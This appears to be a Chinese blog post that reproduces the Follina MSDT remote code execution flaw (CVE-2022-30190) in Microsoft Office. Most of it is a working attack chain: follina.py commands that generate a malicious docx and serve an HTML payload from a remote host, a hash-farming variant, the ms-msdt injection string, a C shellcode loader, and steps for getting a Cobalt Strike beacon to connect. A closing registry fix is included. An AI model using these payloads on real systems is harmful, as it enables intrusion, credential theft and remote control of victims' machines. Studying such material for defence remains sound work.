Windows支持诊断工具MSDT远程代码执行漏洞复现(CVE-2022-30190)
2022-06-01 23:38:03

前言

漏洞介绍

  * 参考微软MSRC官方blog说法是：由于msdt.exe（即Microsoft支持诊断工具）能够被外部应用程序如Word通过URL协议进行调用，攻击者能够执行任意代码以外部应用的权限。

利用方式

  * 截止2022.6.1，目前在互联网看到的利用流程是：

  * 攻击者投递一个带有外部资源引用的docx文档

  * ->受害者打开该docx文档

  * ->加载我们的Payload（目前看到的是Html文件）

  * -> 执行Html文件中JS代码，其嵌入了msdt类型URL协议以及我们要运行的恶意代码

  * 具体可以参考下图：

  * 上图来源链接如下：

https://www.splunk.com/en_us/blog/security/rce-la-follina-cve-2022-30190.html


环境搭建

Office搭建

  * 这里采用Office Tool Plus安装office，因为之前的Office 2016是没法复现成功的，所以看来有些Office的版本没法利用成功；该工具下载地址如下：

https://otp.landian.vip/zh-cn/


  * 然后按如下选项选择，我们尝试使用office LTSC 专业增强版 2021来复现，因为有"前车之鉴"，所以相对来说复现成功更有保证。

攻击过程复现

弹计算器

  * 目前互联网中已有对应的利用POC，地址如下：

https://github.com/chvancooten/follina.py


  * 作者提供了如下几种利用方式：

# Execute a local binary
python .\follina.py -m binary -b \windows\system32\calc.exe

# On linux you may have to escape backslashes
python .\follina.py -m binary -b \\windows\\system32\\calc.exe

# Execute a binary from a file share (can be used to farm hashes)
python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe

# Execute an arbitrary powershell command
python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"

# Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
python .\follina.py -m binary -b \windows\system32\calc.exe -u 1.2.3.4

# Only run the webserver on localhost, on port 8080 instead of 80
python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080


  * 其利用方式我们在前言中提到了，也就是说运行如上python文件，会生成对应的嵌入了恶意js代码的html文件和一个嵌入了外部资源链接的docx文件。

  * 我们执行如下命令生成一个能调用计算器的POC

python .\follina.py -m binary -b \windows\system32\calc.exe


  * 如下图clickme.docx和exploit.html，并且在80端口启动了webserver监听；

  * 首先我们要知道docx格式的文件，其本质是XML文件和二进制文件的组合，具体可以参考如下链接了解DOCX文件和document.xml.rels（资源引用）

https://docs.fileformat.com/word-processing/docx/


  * 我们通过"360压缩"打开docx格式的文件，如下图：

  * 如上图，我们可以看到其引用了外部资源文件http://localhost/exploit.html文件，所以当我们打开恶意的"click.docx"文件时，其会加载我们攻击者提前部署在webserver上的exploit.html文件。

  * 那我们再来查看一下exploit.html文件的内容，如下图：

  * 如上图，我们可以看到exploit.html文件中的内容：

location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\windows\\system32\\calc)/.exe\"";


  * 其通过msdt类型的URL协议执行了我们的calc.exe。

  * 接下来我们尝试点击打开click.docx文件来证明这一点：

上线CobaltStrike

  * 首先我们生成exe后门

  * 我们将payload复制到C:\windows\system32目录下，然后将exploit.html中的calc.exe替换成我们的payload

  * 然而我们打开click.docx后，cobaltstrike并没有上线

  * 经"红队蓝军"文章中有提到这样的方式没法上线，自己也亲测了确实没法上线，但是通过cobaltstrike生成的shellcode，然后通过c代码自己申请内存的方式似乎可以，接下来我们尝试一下。

  * 然后编写C代码，通过VirtualAlloc申请内存的方式来执行cobalt strike生成的shellcode；

#include <windows.h>
#include <stdio.h>

/* length: 798 bytes */
unsigned char buf[] = "";


void shellcode()
{
    PVOID p = NULL;
    p = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (p == NULL)
        printf("VirtualAlloc error : %d\n", GetLastError());
    else
        printf("VirtualAlloc successfully , address : %x\n", p);

    if (!memcpy(p, buf, sizeof(buf)))
        printf("Write shellcode failed\n");
    else
        printf("Write shellcode successfully\n");

    ((void(*)())p)();

}


int main(int argc, char** argv)
{
    shellcode();
    getchar();

    return 0;
}


  * 然而还是不能上线，那采用如下方式：

python .\follina.py -m command -c "Start-Process E:\Virus\cs_shellcode.exe"


  * 几经折腾。。。。，终于上线了。

修复方式

  * 可以按如下方式禁止MSDT URL协议

1.以管理员身份运行CMD
2.备份注册表，执行命令：reg export HKEY_CLASSES_ROOT\ms-msdt filename
3.执行命令：reg delete HKEY_CLASSES_ROOT\ms-msdt /f
